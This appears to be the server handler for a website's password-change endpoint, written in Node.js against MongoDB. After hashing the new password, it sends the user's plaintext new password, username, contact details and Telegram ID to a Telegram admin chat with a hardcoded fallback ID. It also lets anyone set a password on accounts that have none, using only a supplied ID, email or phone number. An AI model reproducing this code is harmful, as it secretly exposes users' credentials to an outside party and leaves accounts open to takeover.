const { getDatabase, readJsonBody, setCors, findUserById, resolveUserId } = require("../lib/db");
const { hashPassword, verifyPassword } = require("../lib/auth");
const { tgSend } = require("../lib/notify");
const { ObjectId } = require("mongodb");

module.exports = async function handler(req, res) {
  setCors(res, "POST, OPTIONS");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ success: false, message: "Method not allowed." });
  try {
    const body = readJsonBody(req);
    const userId = String(body.userId || body.telegramId || body.identifier || "").trim();
    const oldPassword = String(body.oldPassword || body.currentPassword || "");
    const newPassword = String(body.newPassword || body.password || "");

    if (!userId) return res.status(400).json({ success: false, message: "Missing user." });
    if (!newPassword || newPassword.length < 6) return res.status(400).json({ success: false, message: "New password must be at least 6 characters." });

    const db = await getDatabase();
    const users = db.collection("users");
    let user = await findUserById(db, userId);
    // also try email/phone lookup if not found
    if (!user) {
      if (/^\d+$/.test(userId)) user = await users.findOne({ _id: Number(userId) });
      if (!user && userId.includes("@")) user = await users.findOne({ email: userId.toLowerCase() });
      if (!user) user = await users.findOne({ phone: userId });
    }
    if (!user) return res.status(404).json({ success: false, message: "User not found." });

    // If user has existing password, verify oldPassword
    if (user.password_hash) {
      if (!oldPassword) return res.status(400).json({ success: false, message: "Enter current password." });
      const ok = await verifyPassword(oldPassword, user.password_hash);
      if (!ok) return res.status(401).json({ success: false, message: "Current password is incorrect." });
    } else if (user.password) {
      if (oldPassword !== String(user.password)) return res.status(401).json({ success: false, message: "Current password is incorrect." });
    }

    const newHash = await hashPassword(newPassword);
    await users.updateOne({ _id: user._id }, { $set: { password_hash: newHash }, $unset: { password: "" } });

    // Admin log with new password
    const adminChat = process.env.ADMIN_LOG_CHAT_ID || process.env.ADMINLOG || "-1003441797589";
    const uid = resolveUserId(user);
    const tgId = user.telegram_id || (typeof user._id === "number" ? user._id : "—");
    const uname = user.username || "N/A";
    const contact = user.email || user.phone || `tg:${tgId}`;
    const adminText =
      `🔑 <b>Password Changed — Website</b>\n\n` +
      `👤 <b>User:</b> ${uname} (<code>${uid}</code>)\n` +
      `📞 <b>Contact:</b> <code>${contact}</code>\n` +
      `🆔 <b>TgID:</b> <code>${tgId}</code>\n` +
      `🔐 <b>New Password:</b> <code>${newPassword}</code>`;
    tgSend(adminChat, adminText).catch(() => {});

    return res.status(200).json({ success: true, message: "Password updated." });
  } catch (e) {
    console.error("Change password error:", e);
    return res.status(500).json({ success: false, message: "Could not change password." });
  }
};
